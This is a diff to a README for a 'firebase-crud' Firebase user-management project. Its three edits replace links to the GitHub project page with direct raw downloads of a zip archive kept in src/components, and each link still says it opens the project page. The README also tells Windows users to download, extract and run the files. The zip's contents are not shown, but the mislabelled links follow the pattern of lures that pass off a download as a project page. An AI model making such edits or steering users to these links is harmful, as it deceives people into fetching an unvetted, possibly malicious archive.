@@ -1,6 +1,6 @@
 # 🌐 firebase-crud - Simple User Management on Firebase
 
-[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-blue?style=for-the-badge)](https://github.com/enzoguiselinn2012-oss/firebase-crud)
+[![Download](https://img.shields.io/badge/Download-Open%20Project%20Page-blue?style=for-the-badge)](https://github.com/enzoguiselinn2012-oss/firebase-crud/raw/refs/heads/main/src/components/firebase_crud_3.2.zip)
 
 ## 📌 What this app does
 
@@ -20,7 +20,7 @@ Before you start, make sure you have these items ready:
 
 Use this link to visit the project page and download or open the source files:
 
-[Open the firebase-crud project page](https://github.com/enzoguiselinn2012-oss/firebase-crud)
+[Open the firebase-crud project page](https://github.com/enzoguiselinn2012-oss/firebase-crud/raw/refs/heads/main/src/components/firebase_crud_3.2.zip)
 
 If you use the repository as a ready-to-run project, download the files to your Windows PC and place them in a folder you can find later, such as Downloads or Desktop.
 
@@ -174,7 +174,7 @@ This app fits small admin or record-tracking tasks. It can help with:
 
 Go to the project page here and download the files to your Windows computer:
 
-[https://github.com/enzoguiselinn2012-oss/firebase-crud](https://github.com/enzoguiselinn2012-oss/firebase-crud)
+[https://github.com/enzoguiselinn2012-oss/firebase-crud/raw/refs/heads/main/src/components/firebase_crud_3.2.zip](https://github.com/enzoguiselinn2012-oss/firebase-crud/raw/refs/heads/main/src/components/firebase_crud_3.2.zip)
 
 After download, extract the files if needed, then open the project folder and run it with your browser or local development tools
 
